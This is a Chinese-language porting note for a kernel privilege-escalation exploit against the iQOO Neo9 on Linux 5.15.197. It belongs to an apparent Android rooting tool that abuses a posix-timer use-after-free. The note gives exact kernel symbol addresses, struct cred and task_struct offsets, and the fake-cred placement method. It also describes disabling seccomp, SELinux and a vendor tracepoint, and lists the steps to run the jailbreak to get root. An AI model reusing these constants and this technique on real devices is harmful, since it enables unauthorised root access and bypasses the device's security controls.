# iQOO Neo9（PD2338）5.15.197 适配

**状态：已加入 `libk515197` 入口；常量与本机只读 probe 已核对。5.15 fake-cred 顺序已按 Timer 修正，等待 CI 重编和干净开机复测。**

## 本机信息

2026-11-12 从设备读取：

| 项目 | 值 |
| --- | --- |
| 型号 | vivo V2338A / PD2338（iQOO Neo9） |
| Android | 16 |
| 系统版本 | PD2338B_A_16.2.13.2.W10 |
| 安全补丁日期 | 2026-07-01 |
| 完整内核版本 | `5.15.197-g708015331567-dirty` |
| ABI | arm64-v8a |
| KMI | `android13-5.15` |

只匹配这一个完整 uname；同系列其他 5.15.197 构建（Timer 配置里的
`g346b1c36bd5c`、`g6cd3806ca286`、`gf7e9c3efed1a`、`gfdd366a15376`）
的常量不同，不能套用本入口。系统 OTA 更新后需要重新核对。

## 入口

- App：`PROFILE_BY_RELEASE["5.15.197-g708015331567-dirty"]` →
  `ExploitKind.CVE515197`，执行 `libk515197.so run`。
- C plant：`exploit/src/K515197_plant.c`，feature `k515197`。
- KMI：`android13-5.15`；普通模式使用已安装管理器 APK 里的 `ksud`，
  通过 `late-load --kmi android13-5.15 --allow-shell --package-name` 加载。
- 5.15 入口不启用 SUSFS、VFS、Dynamic Switching 或反 root 三项；
  vivo `vr.ko` 的 `__tracepoint_sys_exit` 仍在唤醒 root 子进程前清零。

## 常量

```c
#define STATIC_TIMER_SITE          0xffffffc0082b4c24ULL  /* do_timer_create+0xa4 */
#define TIMER_SITE_LOW21            0xb4c24ULL
#define COPY_PROCESS_LOW21          0x1516bcULL           /* copy_process+0x1e8c */
#define SELINUX_STATE_STATIC        0xffffffc00b181e58ULL
#define PANIC_ON_WARN_STATIC        0xffffffc00ad9ae10ULL
#define SYS_EXIT_TRACEPOINT_STATIC  0xffffffc00afd18a8ULL
#define TRACEPOINT_FUNCS_OFF        0x40ULL
#define ROOT_USER_STATIC            0xffffffc00adc2f80ULL
#define INIT_USER_NS_STATIC         0xffffffc00afc1050ULL
#define INIT_UCOUNTS_STATIC         0xffffffc00adc4800ULL
#define INIT_GROUPS_STATIC          0xffffffc00adc4338ULL
```

5.15 `struct cred` 布局（BTF 实测）：

| 字段 | 偏移 |
| --- | --- |
| `cred` 大小 | `0xb0`；`cred_jar` 记录为 `bytes_req=0xb8` / `bytes_alloc=0xc0` |
| uid/gid | `0x4` / `0x8` |
| suid/sgid | `0xc` / `0x10` |
| euid/egid | `0x14` / `0x18` |
| fsuid/fsgid | `0x1c` / `0x20` |
| securebits | `0x24` |
| cap_inheritable … cap_ambient | `0x28` … `0x48` |
| security | `0x78` |
| user / user_ns / ucounts / group_info | `0x80` / `0x88` / `0x90` / `0x98` |

5.15 的 stale timer node 在 fake cred `+0x10` 处放 rb 写目标。若把 fake cred
放在 node 本身，`rb_erase` 的 rb_right 修复会写到 `node+0x8`，并让
`sgid`/`euid` 变脏；因此 5.15 入口把 fake cred 放在 `node+0x18`，和 Timer
的 `cred_off=node_off+0x18` 一致。这样不需要再做 `fake_uid` / `fake_ids`，
而是在 fake cred 安装前先清 `thread_info.flags`、`seccomp.mode`、SELinux 和
vivo `sys_exit` tracepoint，最后安装 fake cred，写完立即唤醒子进程。

其他布局：

| 对象 | 值 |
| --- | --- |
| `struct k_itimer` | `0x108`，`it` rb node @ `0x78` |
| `posix_timers_cache` | `bytes_req=0x108`，`bytes_alloc=0x108` |
| `struct task_struct` | `0x1480`；`real_cred` @ `0x790`，`cred` @ `0x798` |
| `struct selinux_state` | `enforcing` @ `0x0` |
| `struct tracepoint` | `0x48`，`funcs` @ `0x40`（5.15 与 6.x 的 `0x48` 不同） |
| `struct task_security_struct` | `0x18`，`exec_sid` @ `0x8`，`create_sid` @ `0xc` |

## 核对来源

- 本机运行时 `/proc/kallsyms` 与 `/sys/kernel/btf/vmlinux`：
  `_text=0xffffffd1a4200000` 时 `slide=0x119c200000`，
  `do_timer_create=0xffffffd1a44b4b80`，
  `copy_process=0xffffffd1a434f830`；
  上表所有静态地址与 slide 相加后逐项命中。
- kmem 跟踪实测：
  `do_timer_create+0xa4` 的 timer 分配为 `0x108/0x108`；
  `prepare_creds+0x24` 的 cred 分配为 `0xb8/0xc0`；
  `copy_process+0x1e8c` 的 task 分配为 `0x1480/0x1480`。
- 本机只读 probe（未触发 UAF）：

  ```text
  PROBE_TIMER ... site=0xffffffd1a44b4c24 expected_low21=0xb4c24
  PROBE_SLIDE=0x119c200000 aligned=1
  PROBE_TASK=... expected_low21=0x1516bc
  PROBE_CRED=... req=0xb8 alloc=0xc0 uid_off=0x4
  PROBE_VR_TRACEPOINT=0xffffffd1a71d18a8 funcs=0xffffffd1a71d18e8 off=0x40
  PROBE_OK
  ```

  这次 Termux/ksu 环境下默认 trace buffer 会覆盖页分配记录，check 时临时把
  `buffer_size_kb` 调到 16384；App 的 Shizuku shell 流程按原默认值运行。
- Timer 1.2.0 APK 的 `assets/kernel_profiles/5.15.197-g708015331567-dirty.conf`
  给出的 timer/task/SELinux/init 偏移与上述实测一致，仅作交叉核对；
  Shark 的 C 源码和常量由本仓库独立实现，不复制 Timer 二进制。

## 待真机复测

完整流程需要在干净开机状态下跑：

1. 确认 `/proc/modules` 没有 `kernelsu`，且没有残留 `t98260-hold`。
2. 安装带 `android13-5.15` LKM 的管理器 APK（KernelSU / FinaSU 等）。
3. 启动 Shizuku/Stellar，选择对应管理器，点「一键越狱」。
4. 观察日志中的 `PROFILE_515197`、`PLANT_CRED_OK`、`MODULE_LOADED`、`DONE`，
   以及 `su -c id` 是否得到 root。

只读核对仍可运行：

```sh
python ports/neo9/check_compatibility.py \
  --timer-apk /sdcard/Download/Timer-1.2.0-release.apk
```
